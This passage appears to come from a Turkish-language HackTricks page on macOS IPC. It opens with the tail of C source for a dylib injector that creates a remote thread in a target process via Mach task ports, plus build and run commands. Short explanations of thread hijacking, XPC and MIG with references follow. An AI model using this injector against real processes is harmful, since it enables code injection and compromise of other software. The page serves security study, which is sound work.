(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Görev Portu Üzerinden Thread Ele Geçirme <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bu teknikte bir sürecin thread'i ele geçirilir:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md
{{#endref}}

## XPC

### Temel Bilgiler

XPC, macOS tarafından kullanılan çekirdek olan XNU'nun (XNU) süreçler arası iletişim için bir çerçevedir. XPC, sistemdeki farklı süreçler arasında **güvenli, asenkron yöntem çağrıları yapma** mekanizması sağlar. Bu, her bir **bileşenin** işini yapmak için **sadece ihtiyaç duyduğu izinlerle** çalıştığı **ayrılmış ayrıcalıklarla uygulamalar** oluşturulmasına olanak tanıyan Apple'ın güvenlik paradigmasının bir parçasıdır ve böylece tehlikeye atılmış bir süreçten kaynaklanan potansiyel zararı sınırlamaktadır.

Bu **ileşimin nasıl çalıştığı** ve **nasıl savunmasız olabileceği** hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/
{{#endref}}

## MIG - Mach Arayüzü Üreticisi

MIG, Mach IPC kodu oluşturma sürecini **basitleştirmek** için oluşturulmuştur. Temelde, belirli bir tanım ile sunucu ve istemcinin iletişim kurması için **gerekli kodu üretir**. Üretilen kod çirkin olsa bile, bir geliştirici sadece onu içe aktarmalı ve kodu öncekinden çok daha basit olacaktır.

Daha fazla bilgi için kontrol edin:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md
{{#endref}}

## Referanslar

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{{#include ../../../../banners/hacktricks-training.md}}
